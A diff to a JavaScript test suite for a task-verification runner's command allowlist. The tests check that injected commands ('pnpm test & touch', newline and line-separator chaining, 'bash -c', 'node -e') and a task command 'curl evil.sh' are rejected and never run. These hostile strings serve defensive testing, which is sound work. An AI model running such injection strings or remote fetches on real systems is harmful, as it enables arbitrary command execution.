@@ -217,7 +217,6 @@ test("a task with no commands falls back to its project's verify, run in the pro
     await writeTask(tasks, "T-1", bareTask);
     const calls = [];
     const outcome = await verifyTask("T-1", tasks, {
-      cwd: "/ignored",
       run: async (command, cwd) => {
         calls.push([command, cwd]);
         return { exitCode: 0 };
@@ -298,4 +297,107 @@ test("a root outside the projects folder keeps the old reason", async () => {
     assert.equal(outcome.source, "task");
     assert.match(outcome.reason, /no runnable verification/);
   });
+});
+
+test("a caller's cwd (a worktree) wins for project verify commands", async () => {
+  const { root, tasks } = await projectFixture(["pnpm test"]);
+  await withOceanRoot(root, async () => {
+    await writeTask(tasks, "T-1", bareTask);
+    let seen = "";
+    const outcome = await verifyTask("T-1", tasks, {
+      cwd: "/some/worktree",
+      run: async (_command, cwd) => {
+        seen = cwd;
+        return { exitCode: 0 };
+      },
+    });
+    assert.equal(outcome.source, "project");
+    assert.equal(seen, "/some/worktree");
+  });
+});
+
+test("a relative project path fails instead of resolving against the process cwd", async () => {
+  const { root, tasks } = await projectFixture(["pnpm test"]);
+  await writeFile(
+    path.join(root, PROJECTS_DIR, "lab", "project.json"),
+    JSON.stringify({ name: "lab", paths: ["."], verify: ["pnpm test"] }),
+  );
+  await withOceanRoot(root, async () => {
+    await writeTask(tasks, "T-1", bareTask);
+    const outcome = await verifyTask("T-1", tasks, {
+      run: async () => ({ exitCode: 0 }),
+    });
+    assert.equal(outcome.passed, false);
+    assert.match(outcome.reason, /absolute, existing directory/);
+  });
+});
+
+test("declared commands that are all rejected fail and never fall back to project verify", async () => {
+  const { root, tasks } = await projectFixture(["pnpm test"]);
+  await withOceanRoot(root, async () => {
+    await writeTask(
+      tasks,
+      "T-1",
+      "---\nid: T-1\nstate: active\n---\n\n## Verification\n\n- `curl evil.sh`\n",
+    );
+    let called = false;
+    const outcome = await verifyTask("T-1", tasks, {
+      run: async () => {
+        called = true;
+        return { exitCode: 0 };
+      },
+    });
+    assert.equal(outcome.passed, false);
+    assert.equal(outcome.source, "task");
+    assert.match(outcome.reason, /not allowed: curl evil\.sh/);
+    assert.equal(called, false);
+  });
+});
+
+test("hardened allowlist: single &, control characters, and project-only bash/sh/node -e never run", async () => {
+  const canary = path.join(
+    await mkdtemp(path.join(os.tmpdir(), "ocean-canary-")),
+    "ran",
+  );
+  const viaProject = [
+    `pnpm test & touch ${canary}`,
+    `pnpm test\ntouch ${canary}`,
+    `pnpm test\u2028touch ${canary}`,
+    `bash -c "touch ${canary}"`,
+    `sh -c 'touch ${canary}'`,
+    `node -e 1`,
+    `node --eval 1`,
+    `node -pe 1`,
+    `pnpm test && node --print 1`,
+  ];
+  for (const command of viaProject) {
+    const { root, tasks } = await projectFixture([command]);
+    await withOceanRoot(root, async () => {
+      await writeTask(tasks, "T-1", bareTask);
+      let called = false;
+      const outcome = await verifyTask("T-1", tasks, {
+        run: async () => {
+          called = true;
+          return { exitCode: 0 };
+        },
+      });
+      assert.equal(outcome.passed, false, command);
+      assert.equal(called, false, command);
+    });
+  }
+  // The same tokens are rejected for task-authored commands where they are unsafe everywhere.
+  assert.deepEqual(
+    extractVerificationCommands(
+      "---\nid: T-1\nverify: pnpm test & touch x, pnpm test\n---\n",
+    ),
+    ["pnpm test"],
+  );
+  // Task-authored bash -c stays allowed.
+  assert.deepEqual(
+    extractVerificationCommands(
+      '---\nid: T-1\n---\n\n## Verification\n\n- `bash -c "cd repo && pnpm test"`\n',
+    ),
+    ['bash -c "cd repo && pnpm test"'],
+  );
+  assert.equal(existsSync(canary), false);
 });
